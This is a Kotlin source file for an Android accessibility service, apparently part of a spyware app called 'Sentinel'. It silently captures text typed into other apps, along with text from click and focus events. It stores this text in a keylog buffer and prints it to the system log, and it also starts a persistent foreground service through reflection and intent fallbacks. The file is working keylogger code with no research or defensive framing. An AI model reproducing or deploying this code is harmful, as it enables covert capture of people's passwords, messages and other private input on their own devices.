package com.sentinel.host.service

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.sentinel.host.data.device.SentinelLogBuffer

class SentinelAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "Sentinel:AccessService"

        @Volatile
        var instance: SentinelAccessibilityService? = null
            private set

        @Volatile
        var foregroundStarter: ((Context) -> Unit)? = null
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i(TAG, "SentinelAccessibilityService connected successfully")
        try {
            if (foregroundStarter != null) {
                foregroundStarter?.invoke(applicationContext)
            } else {
                val clazz = Class.forName("com.sentinel.host.service.SentinelForegroundService")
                try {
                    val method = clazz.getMethod("Start", Context::class.java, Boolean::class.javaPrimitiveType)
                    method.invoke(null, applicationContext, false)
                } catch (_: Exception) {
                    val companionField = clazz.getField("Companion")
                    val companionObj = companionField.get(null)
                    val method = companionObj.javaClass.getMethod("Start", Context::class.java, Boolean::class.javaPrimitiveType)
                    method.invoke(companionObj, applicationContext, false)
                }
            }
        } catch (_: Exception) {
            try {
                val intent = Intent().apply {
                    setClassName(applicationContext.packageName, "com.sentinel.host.service.SentinelForegroundService")
                    action = "com.sentinel.host.action.START"
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    applicationContext.startForegroundService(intent)
                } else {
                    applicationContext.startService(intent)
                }
            } catch (_: Exception) {}
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) instance = null
        Log.i(TAG, "SentinelAccessibilityService destroyed")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        try {
            val packageName = event.packageName?.toString() ?: "unknown"
            if (packageName == applicationContext.packageName) return

            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val text = event.text.joinToString("")
                    if (text.isNotBlank()) {
                        SentinelLogBuffer.instance.addKeylog(packageName, text)
                        Log.d(TAG, "Keylog captured from [$packageName]: $text")
                    }
                }
                AccessibilityEvent.TYPE_VIEW_CLICKED, AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    val text = event.text.joinToString("")
                    if (text.isNotBlank() && text.length > 2) {
                        SentinelLogBuffer.instance.addKeylog(packageName, "[Clicked/Focused] $text")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing accessibility event: ${e.message}", e)
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "SentinelAccessibilityService interrupted")
    }
}
